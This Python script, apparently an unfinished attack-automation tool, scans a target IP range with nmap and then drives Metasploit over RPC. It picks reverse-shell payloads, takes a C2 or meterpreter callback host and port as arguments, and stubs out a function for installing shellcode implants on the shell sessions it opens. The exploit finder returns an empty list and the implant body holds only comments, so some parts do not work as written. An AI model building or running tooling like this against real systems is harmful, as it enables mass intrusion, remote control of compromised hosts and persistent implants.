import os, time, json, sys, nmap3, argparse, subprocess, ipaddress
from datetime import datetime, timedelta
from tqdm import tqdm
from pymetasploit3.msfrpc import MsfRpcClient

def parse_ip_range(ip_range):
	if '/' in ip_range:
		ip_network = ipaddress.ip_network(ip_range, strict=False)
		return [str(ip) for ip in ip_network.hosts()]
	elif '-' in ip_range:
		start_ip, end_ip = ip_range.split('-')
		start_ip = ipaddress.ip_address(start_ip)
		end_ip = ipaddress.ip_address(end_ip)

		if start_ip.version != end_ip.version:
			raise ValueError("IP range start and end must be of the same version")
		return [str(ip) for ip in range(int(start_ip), int(end_ip) + 1)]
	else:
		return [str(ipaddress.ip_address(ip_range))]

def nmap_parse(xmlroot):
	nmap = nmap3.Nmap()
	try:
		port_result_dict = {}
		scanned_host = xmlroot.findall("host")
		stats = xmlroot.attrib

		for hosts in scanned_host:
			address = hosts.find("address").get("addr")
			port_result_dict[address] = {}
			port_result_dict[address]["osmatch"] = nmap.parser.parse_os(hosts)
			port_result_dict[address]["ports"] = nmap.parser.parse_ports(hosts)
			port_result_dict[address]["hostname"] = nmap.parser.parse_hostnames(hosts)
			port_result_dict[address]["macaddress"] = nmap.parser.parse_mac_address(hosts)
			port_result_dict[address]["state"] = nmap.parser.get_hostname_state(hosts)
			port_result_dict[address]["scripts"] = nmap.parser.parse_scripts(hosts)

		port_result_dict["runtime"] = nmap.parser.parse_runtime(xmlroot)
		port_result_dict["stats"] = stats
		port_result_dict["task_results"] = nmap.parser.parse_task_results(xmlroot)
	except Exception as e:
		raise(e)
	else:
		return port_result_dict

def nmap_scan(ips):
	nmap = nmap3.Nmap()
	results = {}
	for ip in tqdm(ips, desc="Scanning Hosts: "):
		results[ip] = nmap_parse(nmap.scan_command(ip, "-p- -A"))
	return results

def metasploit_exploit(target, services):
	client = MsfRpcClient('msf_passphrase', ssl=True)

	exploits = find_exploits(services)

	for exploit in tqdm(exploits, desc=f"Exploiting {target}... "):
		msf_exploit = client.modules.use('exploit', exploit)
		options = msf_exploit.options #Use this to determine what info we can to provide
		required_options = msf_exploit.missing_required #Use this to determine what info we need to provide
		payloads = msf_exploit.targetpayloads() #Use this to determine what payloads we can use
		payload = ""
		if "ruby/shell_reverse_tcp" in payloads:
			payload = "ruby/shell_reverse_tcp"
		elif "cmd/unix/reverse" in payloads:
			payload = "cmd/unix/reverse"
		elif "windows/shell/reverse_tcp" in payloads:
			payload = "windows/shell/reverse_tcp"
		else:
			payload = "generic/shell_reverse_tcp"
		result = msf_exploit.execute(payload=payload)
		if result["job_id"] != None:
			print(f"[+] - Exploited {target} via {exploit} -> {payload} Successfully!")
			break
		else:
			print("[X] - Exploit Failed!")

	return client.sessions.list

def find_exploits(ports):
	exploits = []
	
	return exploits

def install_implant(shellcode, sessions):
	client = MsfRpcClient('msf_passphrase', ssl=True)
	for session in sessions.keys():
		if sessions[session]['type'] == "shell":
			shell = client.sessions.session(str(session))
			print(f"[!] - Installing shellcode on session {session}...", end="")
			# Elevation?
			# Shellcode execute here!
			print(f"Done!")

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Automate the attack process')
	parser.add_argument('target', type=str, help='Target IP address range')
	parser.add_argument('callback', type=str, help='Server IP of the meterpreter server or C2')
	parser.add_argument('port', type=str, help='Server Port of the meterpreter server or C2')
	args = parser.parse_args()

	print("[i] - Starting MSF Server...", end="")
	msfrpc_proc = subprocess.Popen(['msfrpcd', '-P', 'msf_passphrase', '-S'])
	time.sleep(10)
	print("Done!")

	try:
		targets = parse_ip_range(args.target)
		nmap_result = nmap_scan(targets)
		nmap_result = dict(filter(lambda x: len(next(iter(x[1].values()))['ports']) > 0, nmap_result.items()))
		print(nmap_result)
		for target in nmap_result.keys():
			sessions = metasploit_exploit(target, nmap_result[target][target])
	except ValueError as e:
		print(f"Error processing IP range: {e}")

	print("[i] - Stopping MSF Server...", end="")
	msfrpc_proc.terminate()
	msfrpc_proc.wait()
	print("Done!")

